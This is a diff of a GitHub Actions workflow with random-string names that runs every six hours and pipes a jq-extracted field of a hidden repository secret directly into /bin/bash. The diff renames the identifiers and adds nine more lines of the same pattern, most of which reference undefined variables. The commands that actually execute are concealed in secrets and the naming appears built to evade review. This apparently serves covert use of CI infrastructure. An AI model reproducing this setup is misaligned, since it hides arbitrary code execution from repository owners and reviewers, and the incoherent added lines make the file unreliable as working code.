@@ -1,19 +1,27 @@
 name: yanqinwang5678
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 5/6 * * *'
+    - cron: '55 1/6 * * *'
 
-jobs:  # 32016
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yanqinwang5678
         env:
-          dg9: ${{ secrets.dg9 }}
+          qtw493: ${{ secrets.qtw493 }}
         run: |
-          echo $dg9 | jq -r .gtvbi2 | /bin/bash
-          echo $d30112 | jq -r .wkm9 | /bin/bash
+          echo $qtw493 | jq -r .csb80800 | /bin/bash
+          echo $ompwh059 | jq -r .vcc58 | /bin/bash
+          echo $cslcp8299 | jq -r .qria310 | /bin/bash
+          echo $oro1 | jq -r .esoox44011 | /bin/bash
+          echo $rnrcr7309 | jq -r .bw294 | /bin/bash
+          echo $elhj5 | jq -r .cr234 | /bin/bash
+          echo $ou5 | jq -r .pdc18 | /bin/bash
+          echo $ne5 | jq -r .zixas95287 | /bin/bash
+          echo $abw75683 | jq -r .bumvu36351 | /bin/bash
+          echo $ws14194 | jq -r .kxguo03 | /bin/bash
 
